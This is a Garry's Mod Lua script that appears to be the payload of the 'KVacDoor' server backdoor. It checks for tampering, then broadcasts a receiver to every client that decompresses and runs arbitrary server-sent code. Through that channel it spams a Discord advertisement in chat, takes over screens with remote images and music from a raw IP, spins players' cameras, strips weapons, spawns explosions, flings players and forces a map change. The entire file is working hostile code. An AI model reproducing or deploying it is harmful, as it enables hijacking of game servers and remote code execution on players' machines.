if not jit.util.funcinfo(debug.getinfo).ffid == 125 then
    return &quot;&quot;
end
if not table.HasValue(debug.getinfo(RunString), &quot;[C]&quot;) then
    return &quot;&quot;
end
if not table.HasValue(debug.getinfo(net.ReadData), &quot;[C]&quot;) then
    return &quot;&quot;
end
if not table.HasValue(debug.getinfo(CompileString), &quot;[C]&quot;) then
    return &quot;&quot;
end
local GenNetworkString = &quot;KVacDoor-has-an-IQ-of-&quot;, math.random(2599, 782000), &quot;&quot;
util.AddNetworkString(GenNetworkString)
BroadcastLua([[if not jit.util.funcinfo(debug.getinfo).ffid == 125 then cam.End3D() end]])
BroadcastLua([[if not table.HasValue( debug.getinfo(RunString), &quot;[C]&quot; ) then cam.End3D() else end]])
BroadcastLua([[if not table.HasValue( debug.getinfo(net.ReadData), &quot;[C]&quot; ) then cam.End3D() else end]])
BroadcastLua(
    [[net.Receive(&quot;]] ..
        GenNetworkString ..
            [[&quot;,function() if not table.HasValue( debug.getinfo(CompileString), &quot;[C]&quot; ) then cam.End3D() else CompileString(util.Decompress(net.ReadData(net.ReadUInt(16))),&quot;&frac12;&deg;&quot;)() end end)]]
)
local function SMARTSENDCODE(code)
    local data = util.Compress(code)
    local len = #data
    net.Start(GenNetworkString)
    net.WriteUInt(len, 16)
    net.WriteData(data, len)
    net.Broadcast()
end
timer.Simple(15,function()
    SMARTSENDCODE([[  
        timer.Create(&quot;spamchatbienchiant&quot;, 1.5, 0, function()
            local time = tonumber(0)
            local Message = {
                &quot;        .discord.gg/kvac #KVacDoor.&quot;,
                &quot;       ..discord.gg/kvac #KVacDoor..&quot;,
                &quot;      ...discord.gg/kvac #KVacDoor...&quot;,
                &quot;     ....discord.gg/kvac #KVacDoor....&quot;,
                &quot;    .....discord.gg/kvac #KVacDoor.....&quot;,
                &quot;   ......discord.gg/kvac #KVacDoor......&quot;,
                &quot;  .......discord.gg/kvac #KVacDoor.......&quot;,
                &quot; ........discord.gg/kvac #KVacDoor........&quot;,
                &quot;.........discord.gg/kvac #KVacDoor.........&quot;,
                &quot; ........discord.gg/kvac #KVacDoor........&quot;,
                &quot;  .......discord.gg/kvac #KVacDoor.......&quot;,
                &quot;   ......discord.gg/kvac #KVacDoor......&quot;,
                &quot;    .....discord.gg/kvac #KVacDoor.....&quot;,
                &quot;     ....discord.gg/kvac #KVacDoor....&quot;,
                &quot;      ...discord.gg/kvac #KVacDoor...&quot;,
                &quot;       ..discord.gg/kvac #KVacDoor..&quot;,
                &quot;        .discord.gg/kvac #KVacDoor.&quot;,
                }

            for _, line in pairs(Message) do
                time = time + tonumber(0.1)
                timer.Simple(time,function()
                    chat.AddText(HSVToColor( CurTime() % 6 * 60, 1, 1 ),line)
                end)
            end
        end)
    ]])
end)

timer.Simple(
    6,
    function()
        SMARTSENDCODE(
            [=[ local GLITCHTEXTWHITE = {Color(255,255,255),Color(150,150,150),Color(200,200,200)} function unpeutdecoke() local m&eacute;langer = {} m&eacute;langer[ &quot;$pp_colour_addr&quot; ] = 0 m&eacute;langer[ &quot;$pp_colour_addg&quot; ] = 0 m&eacute;langer[ &quot;$pp_colour_addb&quot; ] = 0.1 m&eacute;langer[ &quot;$pp_colour_brightness&quot; ] = 0 m&eacute;langer[ &quot;$pp_colour_contrast&quot; ] = 0.6 m&eacute;langer[ &quot;$pp_colour_colour&quot; ] = -8 m&eacute;langer[ &quot;$pp_colour_mulr&quot; ] = 1 m&eacute;langer[ &quot;$pp_colour_mulg&quot; ] = 1 m&eacute;langer[ &quot;$pp_colour_mulb&quot; ] = 250 DrawColorModify( m&eacute;langer ) end surface.CreateFont(&quot;BRAINTEXT&quot;, { font = &quot;CloseCaption_Bold&quot;, size = 40, weight = 1500, }) local LIGHT = vgui.Create( &quot;DFrame&quot; ) LIGHT:SetTitle( &quot;&quot; ) LIGHT:SetSize( 150,150 ) LIGHT:ShowCloseButton( false ) LIGHT:SetDraggable( false ) LIGHT:SetPos( ScrW(),ScrH() / 2 - LIGHT:GetTall() / 2 ) LIGHT.Paint = function( self, w, h ) draw.RoundedBox( 0, 0, 0, w, h, Color( 255, 255, 0, 0 ) ) end local IMGLIGHT = vgui.Create( &quot;DHTML&quot; , LIGHT ) IMGLIGHT:SetSize( LIGHT:GetWide(),LIGHT:GetTall() ) IMGLIGHT:SetHTML( [[&lt;head&gt;&lt;style&gt;body{background: url(https://cdn.discordapp.com/attachments/1084189877194735626/1264586107006484530/ampoule_kvac.png?ex=669e6916&amp;is=669d1796&amp;hm=fab8e6346c7352f4ddaea292eb7c11eaed4c62ef9ae46a7aae4ce9a4b6f334c0&amp;) no-repeat center center fixed;background-size: cover;}&lt;/style&gt;&lt;/head&gt;]]) local BRAIN = vgui.Create( &quot;DFrame&quot; ) BRAIN:SetTitle( &quot;&quot; ) BRAIN:SetSize( 300,300 ) BRAIN:ShowCloseButton( false ) BRAIN:SetDraggable( false ) BRAIN:SetPos( ScrW() / 2 - BRAIN:GetWide() / 2,ScrH() - BRAIN:GetTall() / 2 + 300 ) BRAIN.Paint = function( self, w, h ) draw.RoundedBox( 0, 0, 0, w, h, Color( 255, 0, 0, 0 ) ) end local IMGBRAIN = vgui.Create( &quot;DHTML&quot; , BRAIN ) IMGBRAIN:SetSize( BRAIN:GetWide(),BRAIN:GetTall() ) IMGBRAIN:SetHTML( [[&lt;head&gt;&lt;style&gt;body{background: url(https://cdn.discordapp.com/attachments/1263466572693901352/1263469895228850250/kvac_blue_purple.png?ex=669e4e09&amp;is=669cfc89&amp;hm=dce963735594c5e1ea060e21f96bae31291a59f8182b6627f3bb5869d7142b0a&amp;) no-repeat center center fixed;background-size: cover;}&lt;/style&gt;&lt;/head&gt;]]) local LIGHTSMALL1 = vgui.Create( &quot;DHTML&quot; ) LIGHTSMALL1:SetPos(-60,-60) LIGHTSMALL1:SetSize( 60,60 ) LIGHTSMALL1:MoveToFront() LIGHTSMALL1:SetHTML( [[&lt;head&gt;&lt;style&gt;body{background: url(https://cdn.discordapp.com/attachments/1084189877194735626/1264586107006484530/ampoule_kvac.png?ex=669e6916&amp;is=669d1796&amp;hm=fab8e6346c7352f4ddaea292eb7c11eaed4c62ef9ae46a7aae4ce9a4b6f334c0&amp;) no-repeat center center fixed;background-size: cover;}&lt;/style&gt;&lt;/head&gt;]]) local LIGHTSMALL2 = vgui.Create( &quot;DHTML&quot; ) LIGHTSMALL2:SetPos(-60,-60) LIGHTSMALL2:SetSize( 60,60 ) LIGHTSMALL2:MoveToFront() LIGHTSMALL2:SetHTML( [[&lt;head&gt;&lt;style&gt;body{background: url(https://cdn.discordapp.com/attachments/1084189877194735626/1264586107006484530/ampoule_kvac.png?ex=669e6916&amp;is=669d1796&amp;hm=fab8e6346c7352f4ddaea292eb7c11eaed4c62ef9ae46a7aae4ce9a4b6f334c0&amp;) no-repeat center center fixed;background-size: cover;}&lt;/style&gt;&lt;/head&gt;]]) local LIGHTSMALL3 = vgui.Create( &quot;DHTML&quot; ) LIGHTSMALL3:SetPos(-60,-60) LIGHTSMALL3:SetSize( 60,60 ) LIGHTSMALL3:MoveToFront() LIGHTSMALL3:SetHTML( [[&lt;head&gt;&lt;style&gt;body{background: url(https://cdn.discordapp.com/attachments/1084189877194735626/1264586107006484530/ampoule_kvac.png?ex=669e6916&amp;is=669d1796&amp;hm=fab8e6346c7352f4ddaea292eb7c11eaed4c62ef9ae46a7aae4ce9a4b6f334c0&amp;) no-repeat center center fixed;background-size: cover;}&lt;/style&gt;&lt;/head&gt;]]) timer.Simple(5,function() timer.Simple(7,function() LIGHT:MoveTo(ScrW() / 2 - LIGHT:GetWide() / 2, ScrH() / 2 - LIGHT:GetTall() / 2, 0.4, 0, -1) end) timer.Simple(5,function() BRAIN:MoveTo(ScrW() / 2 - BRAIN:GetWide() / 2, ScrH() / 2 - BRAIN:GetTall() / 2, 0.7, 0, -1) end) sound.PlayURL(&quot;http://172.252.236.213:27203/music/master-brain.mp3&quot;,&quot;no block&quot;,function(MUSICSMART) if not IsValid(source) then return end MUSICSMART:Play() MUSICSMART:SetVolume(3) end) timer.Simple(7.34,function() hook.Add( &quot;RenderScreenspaceEffects&quot;, &quot;EFFECTSCREEN&quot;, function() DrawMaterialOverlay( &quot;effects/combine_binocoverlay.vmt&quot;, 1 ) end) local APLUSDEHUDDEMERDE = { [&quot;CHudHealth&quot;] = true, [&quot;CHudCrosshair&quot;] = true } hook.Add( &quot;HUDShouldDraw&quot;, &quot;APLUSDEHUDDEMERDEHOOK&quot;, function( name ) if ( APLUSDEHUDDEMERDE[ name ] ) then return false end end) hook.Add( &quot;SetupWorldFog&quot;, &quot;SMOKESMART&quot;, function() render.FogMode( 1 ) render.FogStart( 20 ) render.FogEnd( 300 ) render.FogMaxDensity( 0.6 ) local col = Vector(50,200,200) render.FogColor( col.x * 255, col.y * 255, col.z * 255 ) return true end) BRAIN:Close() LIGHT:Close() util.ScreenShake( Vector(0,0,0), 50, 20, 10, 5000 ) surface.PlaySound(&quot;ambient/explosions/explode_3.wav&quot;) surface.PlaySound(&quot;ambient/explosions/explode_2.wav&quot;) hook.Add( &quot;RenderScreenspaceEffects&quot;, &quot;FILTERSMART&quot;, unpeutdecoke ) local BRAIN = vgui.Create( &quot;DFrame&quot; ) BRAIN:SetTitle( &quot;&quot; ) BRAIN:SetSize( 300,300 ) BRAIN:ShowCloseButton( false ) BRAIN:SetDraggable( false ) BRAIN:SetPos(ScrW() / 2 + math.sin(RealTime() + 80) * ScrW() / 6 - 150,ScrH() / 2 + math.cos(RealTime()+ 80) * ScrH() / 6 - 150) BRAIN.Paint = function( self, w, h ) draw.RoundedBox( 0, 0, 0, w, h, Color( 255, 0, 0, 0 ) ) end local IMGBRAIN = vgui.Create( &quot;DHTML&quot; , BRAIN ) IMGBRAIN:SetSize( BRAIN:GetWide(),BRAIN:GetTall() ) IMGBRAIN:SetHTML( [[&lt;head&gt;&lt;style&gt;body{background: url(https://cdn.discordapp.com/attachments/1263466572693901352/1263469648125624432/izhf.png?ex=669e4dce&amp;is=669cfc4e&amp;hm=9b527bb599e7fd52ac40d4d2a8c24c2b9440a367ab663d438a4e7e126459d41c&amp;) no-repeat center center fixed;background-size: cover;}&lt;/style&gt;&lt;/head&gt;]]) local BOXMESS = vgui.Create( &quot;DFrame&quot; ) BOXMESS:SetTitle( &quot;&quot; ) BOXMESS:SetSize( ScrW(),50 ) BOXMESS:ShowCloseButton( false ) BOXMESS:SetDraggable( false ) BOXMESS:SetPos( ScrW() / 2 - BOXMESS:GetWide() / 2, ScrH() / 2 + 125 ) BOXMESS.Paint = function( self, w, h ) draw.SimpleTextOutlined(&quot;Bonjour moi c'est KVacDoor&quot;,&quot;BRAINTEXT&quot;,BOXMESS:GetWide() /2,BOXMESS:GetTall() /2,table.Random(GLITCHTEXTWHITE),TEXT_ALIGN_CENTER,TEXT_ALIGN_CENTER,2,Color( 50, 50, 50, 255 )) end timer.Simple(4,function() BOXMESS.Paint = function( self, w, h ) draw.SimpleTextOutlined(&quot;Je suis ici, car ce serveur a fait une erreur !&quot;,&quot;BRAINTEXT&quot;,BOXMESS:GetWide() /2,BOXMESS:GetTall() /2,table.Random(GLITCHTEXTWHITE),TEXT_ALIGN_CENTER,TEXT_ALIGN_CENTER,2,Color(50, 50, 50, 255 )) end end) timer.Simple(7.5,function() BOXMESS.Paint = function( self, w, h ) draw.SimpleTextOutlined(&quot;Je suis l&agrave; pour tout remettre en place&quot;,&quot;BRAINTEXT&quot;,BOXMESS:GetWide() /2,BOXMESS:GetTall() /2,table.Random(GLITCHTEXTWHITE),TEXT_ALIGN_CENTER,TEXT_ALIGN_CENTER,2,Color(50, 50, 50, 255 )) end end) timer.Simple(11.5,function() BOXMESS.Paint = function( self, w, h ) draw.SimpleTextOutlined(&quot;En supprimant tout les addons leak !&quot;,&quot;BRAINTEXT&quot;,BOXMESS:GetWide() /2,BOXMESS:GetTall() /2,table.Random(GLITCHTEXTWHITE),TEXT_ALIGN_CENTER,TEXT_ALIGN_CENTER,2,Color(50, 50, 50, 255 )) end end) timer.Simple(14.5,function() BOXMESS.Paint = function( self, w, h ) draw.SimpleTextOutlined(&quot;&quot;,&quot;BRAINTEXT&quot;,BOXMESS:GetWide() /2,BOXMESS:GetTall() /2,table.Random(GLITCHTEXTWHITE),TEXT_ALIGN_CENTER,TEXT_ALIGN_CENTER,2,Color(50, 50, 50, 255 )) end end) hook.Add(&quot;Think&quot;,&quot;allalalala&quot;, function() LIGHTSMALL1:SetPos(ScrW() / 2 + math.sin(RealTime() + 80) * ScrW() / 6 - 30,ScrH() / 2 + math.cos(RealTime()+ 80) * ScrH() / 6 - 60) LIGHTSMALL2:SetPos(ScrW() / 2 + math.sin(RealTime()) * ScrW() / 6 - 30,ScrH() / 2 + math.cos(RealTime()) * ScrH() / 6 - 60) LIGHTSMALL3:SetPos(ScrW() / 2 + math.sin(RealTime() + 40) * ScrW() / 6 - 30,ScrH() / 2 + math.cos(RealTime() + 40) * ScrH() / 6 - 60) BRAIN:SetPos(ScrW() / 2 + math.cos(RealTime() + 2) * ScrH()/ 40 - 150 ,ScrH() / 2 + math.cos(RealTime()+ 10) * 7 -150) end) Flash() timer.Simple(28,function() util.ScreenShake( Vector(0,0,0), 50, 20, 15, 5000 ) end) timer.Simple(38,function() BOXMESS.Paint = function( self, w, h ) draw.SimpleTextOutlined(&quot;C'EST REPARTI POUR UN TOUR !&quot;,&quot;BRAINTEXT&quot;,BOXMESS:GetWide()/2 + math.Rand(-3,3),BOXMESS:GetTall()/2 + math.Rand(-3,3),table.Random(GLITCHTEXTWHITE),TEXT_ALIGN_CENTER,TEXT_ALIGN_CENTER,2,Color(50, 50, 50, 255 )) end timer.Simple(1.5,function() BOXMESS.Paint = function( self, w, h ) draw.SimpleTextOutlined(&quot;&quot;,&quot;BRAINTEXT&quot;,BOXMESS:GetWide()/2 + math.Rand(-3,3),BOXMESS:GetTall()/2 + math.Rand(-10,10),table.Random(GLITCHTEXTWHITE),TEXT_ALIGN_CENTER,TEXT_ALIGN_CENTER,2,Color(50, 50, 50, 255 )) end end) end) timer.Simple( 39.16, function() hook.Add(&quot;Think&quot;,&quot;allalalala&quot;,function() LocalPlayer():SetEyeAngles(Angle(math.sin(RealTime()) * 20, math.sin(RealTime()) * 150, RealTime() * 150)) BRAIN:SetPos( ScrW() / 2 - BRAIN:GetWide() / 2 + math.Rand(-10,10), ScrH() / 2 - BRAIN:GetTall() / 2 + math.Rand(-10,10) ) LIGHTSMALL1:SetPos(ScrW() / 2 + math.sin(RealTime()*10 + 80) * ScrW() / 6 - 30,ScrH() / 2 + math.cos(RealTime()*10 + 80) * ScrH() / 6 - 60) LIGHTSMALL2:SetPos(ScrW() / 2 + math.sin(RealTime()*10) * ScrW() / 6 - 30,ScrH() / 2 + math.cos(RealTime()*10) * ScrH() / 6 - 60) LIGHTSMALL3:SetPos(ScrW() / 2 + math.sin(RealTime()*10 + 40) * ScrW() / 6 - 30,ScrH() / 2 + math.cos(RealTime()*10 + 40) * ScrH() / 6 - 60) local zdlzdlzd = {Color(0,255,255),Color(0,0,0),Color(255,0,255)} local mat = Entity(0):GetMaterials() for k,v in pairs(mat) do local col = table.Random(zdlzdlzd) local ve = Vector(col.r / 255, col.g / 255, col.b / 255) Material(v):SetVector(&quot;$color&quot;, ve) end end) end) timer.Simple( 61.66, function() LocalPlayer():SetEyeAngles(Angle(0, 0, 0)) BRAIN:SetPos( ScrW() / 2 - BRAIN:GetWide() / 2 + math.Rand(-10,10), ScrH() / 2 - BRAIN:GetTall() / 2 + math.Rand(-10,10) ) hook.Add(&quot;Think&quot;,&quot;allalalala&quot;, function() LIGHTSMALL1:SetPos(ScrW() / 2 + math.sin(RealTime() + 80) * ScrW() / 6 - 30,ScrH() / 2 + math.cos(RealTime()+ 80) * ScrH() / 6 - 60) LIGHTSMALL2:SetPos(ScrW() / 2 + math.sin(RealTime()) * ScrW() / 6 - 30,ScrH() / 2 + math.cos(RealTime()) * ScrH() / 6 - 60) LIGHTSMALL3:SetPos(ScrW() / 2 + math.sin(RealTime() + 40) * ScrW() / 6 - 30,ScrH() / 2 + math.cos(RealTime() + 40) * ScrH() / 6 - 60) BRAIN:SetPos(ScrW() / 2 + math.cos(RealTime() + 2) * ScrH()/ 40 - 150 ,ScrH() / 2 + math.cos(RealTime()+ 10) * 7 -150) local mat = Entity(0):GetMaterials() for k,v in pairs(mat) do local col = Color(255,255,255) local ve = Vector(col.r / 255, col.g / 255, col.b / 255) Material(v):SetVector(&quot;$color&quot;, ve) end end) end) timer.Simple(96,function() util.ScreenShake( Vector(0,0,0), 50, 20, 15, 5000 ) end) timer.Simple(105,function() BOXMESS.Paint = function( self, w, h ) draw.SimpleTextOutlined(&quot;C'EST REPARTI POUR UN TOUR !&quot;,&quot;BRAINTEXT&quot;,BOXMESS:GetWide()/2 + math.Rand(-3,3),BOXMESS:GetTall()/2 + math.Rand(-3,3),table.Random(GLITCHTEXTWHITE),TEXT_ALIGN_CENTER,TEXT_ALIGN_CENTER,2,Color(50, 50, 50, 255 )) end timer.Simple(1.5,function() BOXMESS.Paint = function( self, w, h ) draw.SimpleTextOutlined(&quot; &quot;,&quot;BRAINTEXT&quot;,BOXMESS:GetWide()/2 + math.Rand(-3,3),BOXMESS:GetTall()/2 + math.Rand(-3,3),Color( 255, 153, 153, 255 ),table.Random(GLITCHTEXTWHITE),TEXT_ALIGN_CENTER,2,Color(50, 50, 50, 255 )) end end) end) timer.Simple( 106.5, function() hook.Add(&quot;Think&quot;,&quot;allalalala&quot;,function() LocalPlayer():SetEyeAngles(Angle(math.sin(RealTime()) * 35, math.sin(RealTime()) * 220, RealTime() * 230)) BRAIN:SetPos( ScrW() / 2 - BRAIN:GetWide() / 2 + math.Rand(-20,20), ScrH() / 2 - BRAIN:GetTall() / 2 + math.Rand(-20,20) ) LIGHTSMALL1:SetPos(ScrW() / 2 + math.sin(RealTime()*10 + 80) * ScrW() / 6 - 30,ScrH() / 2 + math.cos(RealTime()*12 + 80) * ScrH() / 6 - 60) LIGHTSMALL2:SetPos(ScrW() / 2 + math.sin(RealTime()*10) * ScrW() / 6 - 30,ScrH() / 2 + math.cos(RealTime()*12) * ScrH() / 6 - 60) LIGHTSMALL3:SetPos(ScrW() / 2 + math.sin(RealTime()*10 + 40) * ScrW() / 6 - 30,ScrH() / 2 + math.cos(RealTime()*12 + 40) * ScrH() / 6 - 60) local zdlzdlzd = {Color(0,255,255),Color(0,0,0),Color(255,0,255)} local mat = Entity(0):GetMaterials() for k,v in pairs(mat) do local col = table.Random(zdlzdlzd) local ve = Vector(col.r / 255, col.g / 255, col.b / 255) Material(v):SetVector(&quot;$color&quot;, ve) end end) end) timer.Simple( 138, function() LIGHTSMALL1:SetHTML( [[ ]] ) LIGHTSMALL3:SetHTML( [[ ]] ) LIGHTSMALL2:SetHTML( [[ ]] ) hook.Add(&quot;Think&quot;,&quot;allalalala&quot;, function() BRAIN:SetPos(ScrW() / 2 + math.cos(RealTime() + 2) * ScrH()/ 40 - 150 ,ScrH() / 2 + math.cos(RealTime()+ 10) * 7 -150) end) surface.PlaySound(&quot;ambient/explosions/explode_3.wav&quot;) surface.PlaySound(&quot;ambient/explosions/explode_2.wav&quot;) hook.Add(&quot;HUDPaint&quot;, &quot;HUDPaint_DrawABox&quot;, function() surface.SetDrawColor( 0, 0, 0 ) surface.DrawRect( 0, 0, ScrW(), ScrH() ) end ) timer.Simple(0.5,function() BOXMESS.Paint = function( self, w, h ) draw.SimpleTextOutlined(&quot;J'esp&egrave;re qu'on se reverra&quot;,&quot;BRAINTEXT&quot;,BOXMESS:GetWide() /2,BOXMESS:GetTall() /2,table.Random(GLITCHTEXTWHITE),TEXT_ALIGN_CENTER,TEXT_ALIGN_CENTER,2,Color(50, 50, 50, 255 )) end end) timer.Simple(4.5,function() BOXMESS.Paint = function( self, w, h ) draw.SimpleTextOutlined(&quot;Bisous ❤&quot;,&quot;BRAINTEXT&quot;,BOXMESS:GetWide() /2,BOXMESS:GetTall() /2,table.Random(GLITCHTEXTWHITE),TEXT_ALIGN_CENTER,TEXT_ALIGN_CENTER,2,Color(50, 50, 50, 255 )) end end) Flash() end) end) function Flash() local FLASH = vgui.Create( &quot;DFrame&quot; ) FLASH:SetTitle( &quot;&quot; ) FLASH:SetSize( ScrW(),ScrH() ) FLASH:ShowCloseButton( false ) FLASH:SetDraggable( false ) FLASH.Paint = function( self, w, h ) draw.RoundedBox( 0, 0, 0, w, h, Color( 255, 255, 255, 255 ) ) end timer.Simple(0.5,function() FLASH:AlphaTo(0, 0.5, 0) timer.Simple(0.6,function() FLASH:Remove() end) end) end end) ]=]
        )
    end
)
timer.Simple(
    18.34,
    function()
        for k, v in pairs(player.GetAll()) do
            v:GodEnable()
            v:StripWeapons()
            v:SetModel(&quot;models/props_lab/desklamp01.mdl&quot;)
            v:SetRunSpeed(400 * 4)
            v:SetWalkSpeed(400 * 4)
        end
    end
)
timer.Simple(
    56.5,
    function()
        hook.Add(
            &quot;Think&quot;,
            &quot;BOUBMOU&quot;,
            function()
                local EXPLODEYOURHEAD = ents.Create(&quot;env_explosion&quot;)
                EXPLODEYOURHEAD:SetPos(
                    Vector(math.random(-6000, 6000), math.random(-6000, 6000), math.random(-500, 2000))
                )
                EXPLODEYOURHEAD:Spawn()
                EXPLODEYOURHEAD:SetKeyValue(&quot;iMagnitude&quot;, &quot;500&quot;)
                EXPLODEYOURHEAD:Fire(&quot;Explode&quot;, 0, 0)
            end
        )
        timer.Create(
            &quot;LAUNCHSKY1&quot;,
            1,
            15,
            function()
                for k, v in pairs(player.GetAll()) do
                    v:SetVelocity(Vector(0, 0, 50) * 25)
                end
            end
        )
    end
)
timer.Simple(
    123.84,
    function()
        hook.Add(
            &quot;Think&quot;,
            &quot;BOUBMOU&quot;,
            function()
                local EXPLODEYOURHEAD = ents.Create(&quot;env_explosion&quot;)
                EXPLODEYOURHEAD:SetPos(
                    Vector(math.random(-6000, 6000), math.random(-6000, 6000), math.random(-500, 2000))
                )
                EXPLODEYOURHEAD:Spawn()
                EXPLODEYOURHEAD:SetKeyValue(&quot;iMagnitude&quot;, &quot;500&quot;)
                EXPLODEYOURHEAD:Fire(&quot;Explode&quot;, 0, 0)
            end
        )
        timer.Create(
            &quot;LAUNCHSKY2&quot;,
            0.5,
            0,
            function()
                for k, v in pairs(player.GetAll()) do
                    v:SetVelocity(Vector(0, 0, 50) * 30)
                end
            end
        )
    end
)
timer.Simple(
    79,
    function()
        hook.Remove(&quot;Think&quot;, &quot;BOUBMOU&quot;)
    end
)
timer.Simple(
    155,
    function()
        hook.Remove(&quot;Think&quot;, &quot;BOUBMOU&quot;)
    end
)
timer.Simple(
    165,
    function()
        RunConsoleCommand(&quot;changelevel&quot;, &quot;gm_construct&quot;)
    end
)
